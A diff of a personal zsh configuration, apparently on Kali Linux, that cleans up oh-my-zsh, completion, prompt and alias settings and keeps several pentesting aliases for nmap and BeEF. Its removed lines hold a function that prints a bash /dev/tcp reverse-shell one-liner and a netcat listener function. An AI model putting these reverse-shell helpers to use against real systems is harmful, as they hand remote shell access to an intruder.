@@ -1,10 +1,11 @@
-#~/.zshrc file for zsh interactive shells.
+# ~/.zshrc file for zsh interactive shells.
 # Add these lines near the top of your .zshrc file, after the existing setopt commands
 
 # Path to your oh-my-zsh installation.
-#export3# ZSH="$HOME/.oh-my-zsh"
+export ZSH="$HOME/.oh-my-zsh"
+
 # Set name of the theme to load
-#ZSH_THEME="robbyrussell"
+# ZSH_THEME="robbyrussell"
 
 # Plugin list
 plugins=(
@@ -23,7 +24,9 @@ plugins=(
   zsh-autosuggestions
 )
 
-#source $ZSH/oh-my-z.sh
+# Source oh-my-zsh
+# source $ZSH/oh-my-z.sh
+
 # Enable features and set options
 setopt autocd              # change directory just by typing its name
 setopt interactivecomments # allow comments in interactive mode
@@ -49,12 +52,14 @@ bindkey '^[[5~' beginning-of-buffer-or-history    # page up
 bindkey '^[[6~' end-of-buffer-or-history          # page down
 bindkey '^[[H' beginning-of-line                  # home
 bindkey '^[[F' end-of-line                        # end
-bindkey '^[[Z' undo                               # shift + tab undo last action
+bindkey '^[[Z' undo                               # shift + tab undo
 
 # Enable completion features
 autoload -Uz compinit
 compinit -d ~/.cache/zcompdump
-zstyle ':completion:*:*:*:*:*' menu select
+
+# Configure completion styles
+zstyle ':completion:*' menu select
 zstyle ':completion:*' auto-description 'specify: %d'
 zstyle ':completion:*' completer _expand _complete
 zstyle ':completion:*' format 'Completing %d'
@@ -63,10 +68,19 @@ zstyle ':completion:*' list-colors ''
 zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
 zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
 zstyle ':completion:*' rehash true
-zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
-zstyle ':completion:*' use-compctl false
 zstyle ':completion:*' verbose true
 zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'
+zstyle ':completion:*:*:*:*:*' menu select=2  # Enable menu selection for completions
+zstyle ':completion:*' use-cache yes           # Enable caching for completions
+zstyle ':completion:*' cache-path ~/.cache/zsh-completions  # Set cache path for completions
+setopt complete_in_word                          # Complete words in the middle of the command
+setopt auto_list                                 # Automatically list completions if there's more than one
+#setopt long_list_types                           # Enable long listing for completion types
+
+# Activate command-not-found handler
+if [ -f /usr/share/zsh/functions/Completion/Unix/CommandNotFound.zsh ]; then
+    . /usr/share/zsh/functions/Completion/Unix/CommandNotFound.zsh
+fi
 
 # History configurations
 HISTFILE=~/.zsh_history
@@ -104,11 +118,7 @@ if [ -n "$force_color_prompt" ]; then
     fi
 fi
 
-# Configure custom prompt with green and blue or purple and red combination
-# Configure custom prompt with grey and blue combination and specific design
-# Configure custom prompt with grey and blue combination and refined design
-# Configure custom prompt with dimmed colors
-# Configure custom prompt with dimmed colors
+# Configure custom prompt
 configure_prompt() {
     prompt_symbol=𓆲 # Default prompt symbol
     case "$PROMPT_ALTERNATIVE" in
@@ -126,6 +136,7 @@ configure_prompt() {
     esac
     unset prompt_symbol
 }
+
 # Kali config variables (do not modify)
 PROMPT_ALTERNATIVE='twoline'
 NEWLINE_BEFORE_PROMPT='no'
@@ -134,7 +145,7 @@ if [ "$color_prompt" = yes ]; then
     VIRTUAL_ENV_DISABLE_PROMPT=1
     configure_prompt
 
-# Enable syntax-highlighting with dimmed colors
+    # Enable syntax-highlighting with dimmed colors
     if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
         . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
         ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
@@ -152,6 +163,7 @@ if [ "$color_prompt" = yes ]; then
         ZSH_HIGHLIGHT_STYLES[command-substitution]=none
         ZSH_HIGHLIGHT_STYLES[variable]=fg=178
     fi
+    
     # Enable auto-completion
     if [ -f /usr/share/zsh/functions/Completion/Unix/CommandNotFound.zsh ]; then
         . /usr/share/zsh/functions/Completion/Unix/CommandNotFound.zsh
@@ -177,39 +189,27 @@ export LS_COLORS="di=1;34:ln=35:so=32:pi=33:ex=31:bd=34;46:cd=34;43:su=30;41:sg=
 alias ll='ls -l'
 alias la='ls -A'
 alias l='ls -CF'
-alias ll='ls -l'
-alias la='ls -a'
-alias lla='ls -la'
 alias cls='clear'
-alias c='clear'
-alias z3t4rupdate= 'sudo apt update && sudo apt upgrade -y && sudo apt autoremove'
+alias z3t4rupdate='sudo apt update && sudo apt upgrade -y && sudo apt autoremove'
 
 # Show hidden files in directory listing
 export LS_OPTIONS='--color=auto'
 eval "$(dircolors -b)"
 
 # Custom functions can be defined here
-# e.g. alias lsd='ls --color=auto -l -d'
+# e.g. alias lsd='ls --color=auto -l'
 
 # Add color to man pages
-export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
-export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
-export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
-export LESS_TERMCAP_so=$'\E[01;44;33m' # begin reverse video
-export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
-export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
-export LESS_TERMCAP_ue=$'\E[0m'        # reset underline
+export LESS_TERMCAP_mb=$'\E[1;31m'     
+export LESS_TERMCAP_md=$'\E[1;36m'     
+export LESS_TERMCAP_me=$'\E[0m'        
+export LESS_TERMCAP_so=$'\E[01;44;33m' 
+export LESS_TERMCAP_se=$'\E[0m'        
+export LESS_TERMCAP_us=$'\E[1;32m'     
+export LESS_TERMCAP_ue=$'\E[0m'        
 
 # Colored GCC warnings and errors
 export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
-# END USER CONFIGURATION
-term
-
-source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
-#source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
-#setopt SHARE_HISTORYTFILE=~/.zsh_history
-#IHSIZE=10000
-#SAVEHIST=10000# Add these lines at the end of your .zshrc file, after the existing content
 
 # Pentesting-specific aliases
 alias nmap-quick='sudo nmap -sV -O -F --version-light'
@@ -221,23 +221,5 @@ alias start-beef='sudo beef-xss'
 
 # Function to start a simple HTTP server
 function http-server() {
-  local port="${1:-8000}"
-  python3 -m http.server "$port"
+  python3 -m http.server
 }
-
-# Function to generate a reverse shell payload
-function rev-shell() {
-  local ip="${1:-$(ip addr show tun0 | grep -Po 'inet \K[\d.]+')}"
-  local port="${2:-4444}"
-  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
-}
-
-# Function to start a listener
-function listener() {
-  local port="${1:-4444}"
-  nc -lvnp "$port"
-}
-
-# Keep existing source commands for syntax highlighting and autosuggestions
-# source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
-# source ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
